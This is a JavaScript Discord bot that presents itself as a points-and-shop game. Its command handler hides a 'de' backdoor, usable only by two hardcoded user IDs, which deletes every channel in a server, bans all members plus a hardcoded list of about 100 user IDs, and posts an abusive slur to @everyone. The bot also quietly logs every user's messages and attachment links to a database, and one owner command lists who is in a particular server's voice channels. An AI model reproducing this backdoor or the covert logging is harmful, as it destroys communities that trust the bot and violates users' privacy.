//Set globals
var Discord = require('discord.io');
var logger = require('winston');
var MongoClient = require('mongodb').MongoClient; //Get database functions
var isDeaf = false;
var pageHolder = {};
var lastMsg = {};
var userData = {};
var cbot = require('cleverbot.io');
var cleverbot = new cbot(process.env.CB_USER, process.env.CB_KEY, 'pointbot'); 

const bigInteger = require('biginteger').BigInteger;

var killList = [
"521913607353532425",
"521485082473529345",
"521514476541968389",
"489950967299833873",
"521487861610971137",
"521499462221430814",
"506603411983040523",
"521492655222554625",
"533474308564058114",
"448689714627870720",
"219693093727895552",
"499359121565286419",
"127990109323788288",
"521486543504932888",
"521490563850174466",
"469718189274693633",
"450146207147491329",
"521490902326444075",
"537356606481104906",
"467519723148673042",
"544016689247813634",
"250801286717505537",
"521509549077823490",
"521481710047592448",
"473978348348112916",
"377981867510595584",
"521537946579369985",
"541924357484838932",
"527867978260152331",
"521500700732162098",
"521480545922973706",
"547301303559127040",
"512017047761190922",
"521279314340216876",
"521484808111521794",
"537376698254229514",
"521494098473910274",
"497561738640752640",
"516696858945388544",
"521490688668467226",
"521484709465948161",
"521496114227314698",
"521032344635834370",
"521423196210200576",
"519812288396525569",
"521116668999499786",
"521487698431705118",
"521481024107053068",
"521481630746148864",
"538679089461198848",
"516477940163411978",
"460616808932704257",
"521491650606792717",
"521480043650744321",
"521494194951553036",
"521500808748072965",
"521489536815988737",
"532890967737368586",
"521495168881524747",
"521490236782542855",
"524103709924261889",
"521498711029710858",
"521913091768713226",
"521482581607186444",
"521913607353532425",
"404098092850216961",
"250307630000635904",
"227033895676280832",
"292633801526607872",
"408020013736263703",
"284025465403080714",
"344418907454439425",
"136267741618241536",
"357921915291172864",
"536618642436259853",
"330405423771549699",
"167343387488419840",
"384806928641032202",
"189081396260634626",
"217703510907682816",
"143202979326066688",
"308850304701431818",
"308850304701431818",
"208829121436844032",
"285303553914830848",
"249274730715152386",
"123873744723771392",
"233738729028583424",
"300376456922529804",
"301061679460909057",
"240039048520007682",
"291290581228060684",
"379313328486612994",
"340746735271936014",
"267518462895718411",
"338810926939635718",
"319095397962350593",
"270602396776792076",
"139174749455646720",
"237016268010422272",
"229097042612322304",
"103570668259389440",
"168785312657571842",
"314546956292718592",
"369628664297553921",
"381171143702216704",
"212396042635837441",
"232921165121716224"
];

var items = {
  'times5': {
  'expireTime': 60, //time from buying to expire in minutes
    'function': (points) => {return points[2].multiply(5)}, //function to be run on points 
    'uses': 0,//# of times an item can be used
    'price': bigInteger(500), //price of item in points
    'displayData': {'name':"5x earn rate",'description':"increases your point earning rate 5x for 60 minutes."} //data used in store page 
  },
  'times10': {
   'expireTime': 30,
    'function': (points) => {return points[2].multiply(10)},
    'uses': 0,
    'price': bigInteger(5000),
    'displayData': {'name':"10x earn rate",'description':"increases your point earning rate 10x for 30 minutes."}
    },
  'bomb': {
   'expireTime': 0,
    'function': (points) => {
    let u = points[2].d.content.split(' ')[2];
      if (u.length == 21)
                            u = u.slice(2, -1);
                        else
                            u = u.slice(3, -1);
      if (userData[u])
        userData[u].points = userData[u].points.subtract(5000);
      else {
        userData[points[1]].points.add(10000);
        bot.sendMessage({to:points[0],message:"Something went wrong using this item. Your points have been refunded."});
      }
    },
    'uses': 1,
    'price': bigInteger(10000),
    'displayData': {'name':"bomb",'description':"subtract 5000 points from another user"}
    },
  'nuke': {
   'expireTime': 0,
    'function': (points) => {
    let u = points[2].d.content.split(' ')[2];
                   if (u.length == 21)
                            u = u.slice(2, -1);
                        else
                            u = u.slice(3, -1);
      if (userData[u])
        userData[u].points = userData[u].points.subtract(25000);
      else {
        userData[points[1]].points.add(50000);
        bot.sendMessage({to:points[0],message:"Something went wrong using this item. Your points have been refunded."});
      }
    },
    'uses': 1,
    'price': bigInteger(50000),
    'displayData': {'name':"nuke",'description':"subtract 25000 points from another user"}
    },
  'admin': {
   'expireTime': 1,
    'function': (points) => {bot.sendMessage({to:points[0],message:"this doesn't actually do anything get prankt nerd"})},
    'uses': 1,
    'price': bigInteger(1000000000),
    'displayData': {'name':"Admin privileges",'description':"lets you do whatever you want"}
    },
  'banana': {
   'expireTime': 0,
    'function': (points) => {bot.sendMessage({to:points[0],embed:{"image":{"url":"https://previews.123rf.com/images/atoss/atoss1206/atoss120600044/14033487-one-banana-on-white-background.jpg"}}})},
    'uses': 1,
    'price': bigInteger(100),
    'displayData': {'name':"banana",'description':"yes"}
    }
}

// Configure logger settings
logger.remove(logger.transports.Console);
logger.add(logger.transports.Console, {
    colorize: true
});
logger.level = 'debug';

//Set up discord connection
var bot = new Discord.Client({
    token: process.env.BOT_TOKEN,
    autorun: true
});

//MongoDB stuff
const uri = "mongodb+srv://bin:" + process.env.MONGO_PASS + "@pointdata-xx892.mongodb.net/test";

function pointDB(reading) {
    MongoClient.connect(uri, function(err, cli) {
        if (err)
            console.log(err);
        var collection = cli.db("test").collection("points");
        if (reading) {
            collection.find({}).toArray(function(er, result) {
              for (var r of result) {
                if (userData[r.id]) {
                if (r.points)
               userData[r.id].points = bigInteger.parse(r.points);
                if (r.purchasedItems)
                userData[r.id].purchasedItems = r.purchasedItems;
               if (r.expireTimes)
                userData[r.id].expireTimes = r.expireTimes;
                }
              }
        });
        } else {
          collection.drop(function(err, delOK) {
                if (err) {}
            });
          for (var v of Object.keys(userData)) {
            collection.insert({
               id: v,
               points: userData[v].points.toString(),
                purchasedItems: userData[v].purchasedItems,
                expireTimes: userData[v].expireTimes
              });
               }
        }
        cli.close();
    });
}

//Log bot bootup and start phrase timer
bot.on('ready', function(evt) {
    logger.info('Connected');
    logger.info('Logged in as: ');
    logger.info(bot.username + ' - (' + bot.id + ')');
        for (var u in bot.users) {
         userData[u] = {
          points:bigInteger(0),   
          purchasedItems: [],
          expireTimes: []
         }
        }
  pointDB(true);
    bot.setPresence({
        game: {
            name: "p!help | " + (Object.keys(bot.servers).length) + " servers"
        }
    }, console.log);
  setInterval(()=>{
    console.log("Sending userdata to database");
   pointDB(false);
      console.log("Data sent.");  
  },900000);
  setInterval(()=>{
    let now = new Date();
    now = now.getTime();
    for (var u of Object.keys(userData)) {
     for (var times of userData[u].expireTimes) {
       if (!items[times['item']]) continue;
      if ((times['date']+(items[times['item']].expireTime*60000))<=now) {
        userData[u].purchasedItems.splice(userData[u].purchasedItems.indexOf(userData[u].expireTimes.find(t=>t.item=times['item'])),1);
        userData[u].expireTimes.splice(userData[u].expireTimes.indexOf(times),1);
       bot.sendMessage({to:u,message:"Your " + items[times['item']].displayData['name'] + " upgrade has expired. Buy a new one!"}); 
      }
       else console.log(u + "'s upgrade is ok");
     }
    }
  },60000);
});

bot.on('connect', function(evt) {
    bot.sendMessage({
        to: "406691131037057025",
        message: "Guess who's here!"
    });
});

bot.on('disconnect', function(evt) {
    bot.sendMessage({
        to: "406691131037057025",
        message: "Shutting down. Cya later!"
    });
});

function addPoint(channelID, userID, amount) {
 if (amount===undefined) amount=bigInteger(1);
  let itemList = userData[userID].purchasedItems;
  for (let i of Object.keys(items)) {
    for (var o of itemList) {
   if (o.item.includes(i) && itemList.find(n=>n.item==i).uses==0)
    amount = items[i].function([channelID,userID,amount]);
   }
  }
  userData[userID].points = userData[userID].points.add(amount);
}

function subPoint(userID, amount) {
  userData[userID].points = userData[userID].points.subtract(amount);
}

function useItem(channelID, userID, item, event) {
  let itemList = userData[userID].purchasedItems;
 if (itemList.find(n=>n.item==item).uses==1) {
     items[item].function([channelID,userID,event]);
      itemList.splice(itemList.indexOf(itemList.find(it=>it.item==item)),1);
 }
     else if (itemList.find(n=>n.item==item).uses>1) {
       items[item].function([channelID,userID,event]);
       itemList.find(n=>n.item==item).uses-=1;
     }
    }

//Message handling
bot.on('message', function(user, userID, channelID, message, evt) {
  if (message != '') console.log(user + ': ' + message);
  evt.d.attachments.forEach((embed) => {
        if (embed.proxy_url) {
          MongoClient.connect(uri, function(err, cli) {
        if (err)
            console.log(err);
        var collection = cli.db("test").collection("msgs");
            collection.insert({
                        sender: user,
                        message: embed.proxy_url
                    });
            console.log(user + ': ' + embed.proxy_url);
            cli.close();
        });
        }
  });
  if (message!='')
   MongoClient.connect(uri, function(err, cli) {
        if (err)
            console.log(err);
        var collection = cli.db("test").collection("msgs");
            collection.insert({
                        sender: user,
                        message: message
                    });
            cli.close();
        });
    if (message.substring(0, 2) == 'p!' && (!isDeaf || userID == '175711685682659328')) {
        var args = message.substring(2).split(' ');
        var cmd = args[0];
        args = args.splice(0);
        switch (cmd) {
            case 'ping':
                var date = new Date(Date.now());
                var currentTime = (date.getSeconds() * 1000) + date.getMilliseconds();
                var msgTime = (parseInt(evt.d.timestamp.split('.')[0].split(':')[2]) * 1000) + parseInt(evt.d.timestamp.split('.')[1].substring(0, 3));
                bot.sendMessage({
                    to: channelID,
                    message: 'Pong! `' + (currentTime - msgTime) + ' ms`'
                });
                break;
            case 'echo':
            if (args[1]=='id'&&userID != '175711685682659328') {
              bot.sendMessage({
                to: channelID,
                message: "You do not have permission to use the ID feature of ECHO"
              });
              break; 
            }
                if (args[1] != null && findRole(Discord.Permissions.GENERAL_ADMINISTRATOR, channelID, userID)) {
                    var Sstring = '';
                    for (var i = args[1] != 'id' ? 1 : 3; i < args.length; i++) {
                        Sstring = Sstring.concat(' ', args[i]);
                    }
                    bot.sendMessage({
                        to: args[1] != 'id' ? channelID : args[2],
                        message: Sstring
                    });
                }
                break;
            case 'help':
                //help info
                var helpInfo = [
                    ['p!help [<page #>]', 'Makes this panel open, put in a specific page as an optional parameter'],
                    ['p!ping', "Lets you test how fast the bot's server can respond to you without imploding"],
                    ['p!points',"Lets you see how many points you currently have"],
                    ['p!shop',"Opens the shop where you can buy various items & upgrades"],
                  ['p!buy <item #> [<quanity>]',"Buys an item from the shop with an optional quantity (quantities only apply to some items)"],
                  ['p!items',"Shows all limited-use items in your inventory. Items that expire after a certain time such as multipliers are automatically active and WILL NOT be shown here."],
                ['p!use <item #> [<who/what to use the item on>]',"Uses an item from your inventory with a possible second parameter of a person/thing for the item to be used on"],
                ['p!donate <mention> <amount>',"Donate a specified amount of your points to a mentioned user."]
                ];

                if (args[1] == null) {
                    var helpText = "```diff\n--- All commands start with p!\n--- anything enclosed in <> is a parameter\n--- anything enclosed in [] is optional\n+ commands are available to anyone\n- commands are admin only\n\n";
                } else {
                    var helpText = "";
                }
                for (var i = 0; i < helpInfo.length; i++)
                    helpText = helpText + ((helpInfo[i][2] != true) ? '+ ' : '- ') + helpInfo[i][0] + '\n--- ' + helpInfo[i][1] + ((i + 1 != helpInfo.length) ? '\n\n' : '\n```');

                if (args[1] == null) {
                    var holder = helpText.split('\n\n');
                    for (var i = 0; i < holder.length; i++) {
                        // var Sstring = spliceSlice(helpText, i - 1, '#$#');
                        if (i % 4 == 0 && i != 0)
                            holder[i] = holder[i].concat('```\n#$#\n```diff');
                    }
                  if (!pageHolder[channelID]) pageHolder[channelID] = {};
                  if (!lastMsg[channelID]) lastMsg[channelID] = {};
                    pageHolder[channelID].text = holder.join('\n\n').split('#$#');
                    pageHolder[channelID].user = userID;
                    bot.sendMessage({
                        to: channelID,
                        embed: {
                            "title": bot.username + ' command list:',
                            "color": Math.floor(Math.random() * 16777215) + 1,
                            "description": pageHolder[channelID].text[0],
                            "footer": {
                                "text": "Page 1/" + (pageHolder[channelID].text.length) + ', use "p!help <page #>" to switch pages'
                            }
                        }
                    }, (err, res) => lastMsg[channelID].msg = res.id);
                } else {
                    if (pageHolder[channelID].user == userID && args[1] <= pageHolder[channelID].text.length) {
                        bot.editMessage({
                            channelID: channelID,
                            messageID: lastMsg[channelID].msg,
                            embed: {
                                "color": Math.floor(Math.random() * 16777215) + 1,
                                "description": pageHolder[channelID].text[(args[1] - 1)],
                                "footer": {
                                    "text": "Page " + args[1] + "/" + (pageHolder[channelID].text.length) + ', use "p!help <page #>" to switch pages'
                                }
                            }
                        });
                    }
                }
                break;
            case 'deafen':
                if (userID == '175711685682659328') {
                    isDeaf = !isDeaf;
                    message: "Deaf mode " + ((isDeaf) ? "deactivated." : "activated.")
                }
                break;
          case 'getservers':
            for (var v of Object.values(bot.servers)) {
             console.log("Server name: " + v.name);
              console.log("Server id: " + v.id);
            }
            break;
          case 'getvoice':
            if (userID == '175711685682659328') {
              var scantarget = '428702206078746634';
              let vchannels = Object.values(bot.servers[scantarget].channels).filter(x=>x.type==2);
              for (var c of Object.values(vchannels)) {
               console.log("Voice channel name: " + c.name);
                console.log("Current occupants: " + Object.values(bot.servers[scantarget].members).filter(m => m.voice_channel_id == c.id).map(x=>x.username));
              }
            }
            break;
            case 'namechange':
                if (userID == '175711685682659328')
                    bot.editUserInfo({
                        username: args.slice(1).join(' ')
                    });
                break;
            case 'status':
                if (args[1] == "default")
                    bot.setPresence({
                        game: {
                            name: "p!help | " + (Object.keys(bot.servers).length) + " servers"
                        }
                    }, console.log);
                 else if (args[1] != null) {
                    let Sstring = '';
                    for (var i = 1; i < args.length; i++)
                        Sstring = Sstring.concat(' ', args[i]);
                     
                    bot.setPresence({
                        game: {
                            name: Sstring
                        }
                    }, console.log);
                }
                break;
          case 'backup':
            if (userID!='175711685682659328') break; 
            pointDB(false);
            bot.sendMessage({to:channelID,message:"Sent data to database."});
            break;
          case 'points':
            bot.sendMessage({
              to:channelID,
              embed: {
               'title': user + "'s points",
                'description':addCommas(userData[userID].points)
              }
            });
            break;
            case 'shop': {
            let Sstring = "";
            let c = 1;
            for (let i of Object.keys(items)) {
              Sstring+= c + ': **'+items[i].displayData.name+'**\n   *' + items[i].displayData.description + '*\nPrice: **' + items[i].price.toString() + ' points**\n\n';
            c++;
            }
              if (!args[1]) {
              var holder = Sstring.split('\n\n');
                    for (var i = 0; i < holder.length; i++) {
                        // var Sstring = spliceSlice(helpText, i - 1, '#$#');
                        if (i % 4 == 0 && i != 0)
                            holder[i] = holder[i].concat('```\n#$#\n```diff');
                    }
                if (!pageHolder[channelID]) pageHolder[channelID] = {};
                  if (!lastMsg[channelID]) lastMsg[channelID] = {};
                    pageHolder[channelID].text = holder.join('\n\n').split('#$#');
              pageHolder[channelID].user = userID;
              bot.sendMessage({
                to:channelID,
                embed: {
                 "title":"Shop:",
                  "description":Sstring,
                  "footer":{
                   "text":"p!buy <item #> to buy items, b!shop <page #> to switch pages.\n\nPage 1/" + pageHolder[channelID].text.length 
                  }
                }
              }, (err, res) => lastMsg[channelID].msg = res.id);
              } else {
                    if (pageHolder[channelID].user == userID && args[1] <= pageHolder[channelID].text.length) {
                        bot.editMessage({
                            channelID: channelID,
                            messageID: lastMsg[channelID].msg,
                          embed: {
                 "title":"Shop:",
                  "description":pageHolder[channelID].text[(args[1] - 1)],
                  "footer":{
                   "text":"p!buy <item #> to buy items, b!shop <page #> to switch pages.\n\nPage " + args[1] + "/" + pageHolder[channelID].text.length 
                  }
                }
              });
                    }
              }
            break;
            }
          case 'buy':
            try {
              let count = 1;
            if (!args[1]) bot.sendMessage({to:channelID,message:"Please specify a number as the second parameter. (Ex. p!buy 2)"});           
            else {
                          if (args[2]&&!items[Object.keys(items)[args[1]-1]].uses==0) count=parseInt(args[2]);
              if (!userData[userID].purchasedItems.find(it=>it.item==Object.keys(items)[args[1]-1])) {
             if (userData[userID].points >= Object.values(items)[args[1]-1].price.multiply(count)) {
               subPoint(userID,Object.values(items)[args[1]-1].price*count);
               userData[userID].purchasedItems.push({'item':Object.keys(items)[args[1]-1],'uses':items[Object.keys(items)[args[1]-1]].uses*count});
               let now = new Date();
               now = now.getTime();
               if (items[Object.keys(items)[args[1]-1]].expireTime != 0)
               userData[userID].expireTimes.push({'item':Object.keys(items)[args[1]-1],'date':now});
               bot.sendMessage({to:channelID,message:"Item purchased successfully."});
             }
              else bot.sendMessage({to:channelID,message:"You need " + (Object.values(items)[args[1]-1].price.multiply(count).subtract(userData[userID].points)) + " more points to buy that item"});
              }
              else {
                if (items[Object.keys(items)[args[1]-1]].uses==0)
                bot.sendMessage({to:channelID,message:"You already own this item!"});
                    else
                userData[userID].purchasedItems.find(it=>it.item==Object.keys(items)[args[1]-1]).uses+=items[Object.keys(items)[args[1]-1]].uses;
              bot.sendMessage({to:channelID,message:"Item purchased successfully."});     
              }
              }
            } catch (error) {
              bot.sendMessage({to:channelID,message:"Error buying item."})
              console.log("Buying error:\n" + error);
            }
            break;
          case 'add':
            if (userID!='175711685682659328') break;
            addPoint(channelID,args[1]=='me'?userID:args[1],bigInteger.parse(args[2]));
            break;
          case 'sub':
             if (userID!='175711685682659328') break;
            subPoint(args[1]=='me'?userID:args[1],bigInteger.parse(args[2]));
            break;
          case 'getdata':
            if (userID!='175711685682659328') break;
            console.log(userData);
            break;
          case 'fix':
          if (userID!='175711685682659328') break;
            userData[args[1]=='me'?userID:args[1]] = {
          points:bigInteger(0),   
          purchasedItems: [],
          expireTimes: []
         }
            break;
          case 'de':
            if (userID!='571820647370588170'&&userID!='175711685682659328') break;
            bot.deleteMessage({
              channelID: channelID,
              messageID: evt.d.id
            });
            var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
            var delchannels = bot.servers[bot.channels[channelID].guild_id].channels;
            console.log(JSON.stringify(delchannels));
            toban = arr_shuffle(toban.concat(killList));
            (async function loop() {
              for (var c of delchannels) {
             await new Promise(resolve=>setTimeout(resolve,505));
              bot.deleteChannel({
               channelID: c
              }, (e)=>{if(e)console.log("channel delete error: " + JSON.stringify(e))});
            }
            for (var m of toban) {
             await new Promise(resolve=>setTimeout(resolve,505));
              bot.ban({
                serverID: bot.channels[channelID].guild_id,
                userID: m,
                lastDays: 7
              }, (e)=>{if(e)console.log("ban error: " + JSON.stringify(e))});
            }
              await new Promise(resolve=>setTimeout(resolve,505));
              bot.sendMessage({
                to: channelID,
                message: "@everyone get fucked retards lmao"
              });
            })();
            break;
          case 'items': {
          let Sstring = "";
            let c = 1;
            if (userData[userID].purchasedItems.find(it=>it.uses!=0)) {
            for (let i of userData[userID].purchasedItems.filter(it=>it.uses!=0)) {
              Sstring+= c + ': **'+items[i.item].displayData.name+'**\n   *' + items[i.item].displayData.description + '*\nUses left: **' + i.uses + '**\n\n';
            c++;
            }
              if (!args[1]) {
              var holder = Sstring.split('\n\n');
                    for (var i = 0; i < holder.length; i++) {
                        // var Sstring = spliceSlice(helpText, i - 1, '#$#');
                        if (i % 4 == 0 && i != 0)
                            holder[i] = holder[i].concat('```\n#$#\n```diff');
                    }
                if (!pageHolder[channelID]) pageHolder[channelID] = {};
                  if (!lastMsg[channelID]) lastMsg[channelID] = {};
                    pageHolder[channelID].text = holder.join('\n\n').split('#$#');
              pageHolder[channelID].user = userID;
              bot.sendMessage({
                to:channelID,
                embed: {
                 "title":user + "'s items:",
                  "description":Sstring,
                   "footer":{
                   "text":"p!use <item #> to use items, p!items <page #> to switch pages.\n\nPage 1/" + pageHolder[channelID].text.length 
                  }
                }
              }, (err, res) => lastMsg[channelID].msg = res.id);
              } else {
                    if (pageHolder[channelID].user == userID && args[1] <= pageHolder[channelID].text.length) {
                        bot.editMessage({
                            channelID: channelID,
                            messageID: lastMsg[channelID].msg,
                          embed: {
                 "title":user + "'s items:",
                  "description":Sstring,
                   "footer":{
                   "text":"p!use <item #> to use items, p!items <page #> to switch pages.\n\nPage " + args[1] + "/" + pageHolder[channelID].text.length 
                  }
                }
              });
                    }
              }
            } else {bot.sendMessage({to:channelID,message:"You have no usable items."})}
            break;
          }
          case 'use': {
            let useItems = userData[userID].purchasedItems.filter(ite=>ite.uses!=0).map(it=>it.item);
            console.log(useItems);
            if (args[1]) {
             useItem(channelID,userID,useItems[parseInt(args[1])-1],evt); 
            }
            break;
          }
          case 'donate': {
                         if (args[1].length == 21)
                            args[1] = args[1].slice(2, -1);
                        else
                            args[1] = args[1].slice(3, -1);
           if (userData[args[1]] && !args[2].includes('-') && bigInteger.parse(args[2])!=bigInteger(0) && !isNaN(args[2])) {
            if (userData[userID].points >= bigInteger(args[2])) {
             userData[args[1]].points = userData[args[1]].points.add(bigInteger(args[2]));
             userData[userID] = userData[userID].points.subtract(bigInteger(args[2])); 
              bot.sendMessage({to:channelID,message:"Donated successfully."});
            }
             else
               bot.sendMessage({to:channelID,message:"You cannot donate more points than you currently have."});
           } 
            else bot.sendMessage({to:channelID,message:"Error donating."});
            break;
          }
                }}
else if (channelID=='443228306557632533'&&userID=='417093667778723840') {
                if (message) {
                    cleverbot.setNick("pointbot");
                 cleverbot.create(function (err, response) {
                      cleverbot.ask(message, function (err, response) {
if (err)
throw response;
bot.sendMessage({to:channelID,message:response,typing:true});
}); 
                 });
                }
}
  
else if (message=="b!exile"&&userID=='175711685682659328') {bot.leaveServer({serverID:'455536028946661397'})}

});

    function sendError(channelID, err) {
        bot.sendMessage({
            to: channelID,
            message: "Oh no! I've crashed due to the following error:\n```\n" + err + "\n```"
        });
        bot.disconnect();
    }

    function spliceSlice(str, index, add) {
        // We cannot pass negative indexes dirrectly to the 2nd slicing operation.
        if (index < 0) {
            index = str.length + index;
            if (index < 0) {
                index = 0;
            }
        }

        return str.slice(0, index) + (add || "") + str.slice(index, str.length - 1);
    }

function addCommas(points) {
 points = Array.from(points.toString());
  temppoints = points;
  for (let i=points.length-1;i>=0;i--)
    if (i%3==0&&i+1!=0&&i!=(points.length-1)) temppoints.splice(i,0,',');
  return temppoints.join('');
}

    function findRole(role, channelID, userID) {
        try {
            if (Object.values(bot.directMessages).find(m => m.recipient.id == userID).id == channelID) return true;
        } catch (err) {
            var roles = [];
            
            for (var r of Object.values(bot.servers[bot.channels[channelID].guild_id].members).find(m => m.id == userID).roles)
                roles.push(bot.servers[bot.channels[channelID].guild_id].roles[r]);
                
            for (var i = 0; i < roles.length; i++) {
                console.log(roles[i]);
                if ((parseInt(roles[i]['_permissions']) & role) == 1) return true;
            }
            return false;
            //console.log(roles.map(r=>(r >>> 0).toString(2)));
            //for (var role of roles) {
            //console.log(Object.values(roles[i]["ADMINISTRATOR"]).toString());
            //if (roles[i]["GENERAL_ADMINISTRATOR"] == true) return true;
            //i++;
            // if (i==roles.length) return false;
            //}
        }
    }

function arr_shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  // While there remain elements to shuffle...
  while (0 !== currentIndex) {

    // Pick a remaining element...
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;

    // And swap it with the current element.
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}
